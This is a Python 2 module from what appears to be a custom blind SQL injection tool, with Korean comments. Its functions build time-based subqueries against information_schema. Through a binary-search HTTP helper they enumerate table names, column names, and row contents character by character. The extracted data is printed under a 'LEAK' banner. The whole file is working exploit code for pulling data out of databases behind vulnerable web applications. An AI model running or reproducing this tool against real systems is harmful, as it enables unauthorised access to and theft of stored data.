# -*- coding: utf-8 -*-

import httplib
import urllib
from urlparse import urlparse
import sys
import argparse
import setting as set


def time_based_sql(db_type):
    # First checking table nums
    set.caller = "time"
    if set.args.column != "" and set.args.table != "":
        get_cnt_query('d')
    elif set.args.table != "":
        get_cnt_query('c')
    else:  # 구현쓰중
        get_cnt_query('t')


def get_data(div, count):
    print "Finded " + str(count) + " Data"
    print "============LEAK============"
    for i in range(0, int(count)):  # getiing a length of data
        for j in (set.args.column.split(',')):
            if set.args.column.split(",")[0] <> j:
                sys.stdout.write(",")
            global d_column
            d_column = j
            pnum = set.binary_httpreq(1, 32, get_length_query(div, i))
            for k in range(1, int(pnum) + 1):  # getting a data
                vuln_part = get_data_query(div, i, k)
                sys.stdout.write(chr(set.binary_httpreq(1, 128, vuln_part)))
        print ""
    print "============================"


def get_length_query(div, count):
    if div == 't':
        tlength = "(select length(table_name) from information_schema.tables where table_type='base table' limit 1 offset " + str(count) + ")"
        return tlength
    elif div == 'c':
        clength = "(select length(column_name) from information_schema.columns where table_name='" + set.args.table + "' limit 1 offset " + str(count) + ")"
        return clength
    elif div == 'd':
        dlength = "(select length(" + d_column + ") from " + set.args.table + " limit 1 offset " + str(count) + ")"
        return dlength


def get_data_query(div, count, pnum):
    if div == 't':
        tname = "(select ascii(substr(table_name," + str(pnum) + ",1)) from information_schema.tables where table_type='base table' limit 1 offset " + str(count) + ")"
        return tname
    elif div == 'c':
        cname = "(select ascii(substr(column_name," + str(pnum) + ",1)) from information_schema.columns where table_name='" + set.args.table + "' limit 1 offset " + str(count) + ")"
        return cname
    elif div == 'd':
        dname = "(select ascii(substr(" + d_column + "," + str(pnum) + ",1)) from " + set.args.table + " limit 1 offset " + str(count) + ")"
        return dname


def get_cnt_query(div):
    if div == 't':
        tcount = "(select count(*) from information_schema.tables where table_type='base table')"  # table  개수 확인
        count = set.binary_httpreq(1, 1024, tcount)
        get_data('t', count)
    elif div == 'c':
        ccount = "(select count(*) from information_schema.columns where table_name='" + set.args.table + "')"  # column 개수 확인
        count = set.binary_httpreq(1, 1024, ccount)
        get_data('c', count)
    elif div == 'd':
        dcount = "(select count(*) from " + set.args.table + ")"  # data 개수 확인
        count = set.binary_httpreq(1, 1024, dcount)
        get_data('d', count)
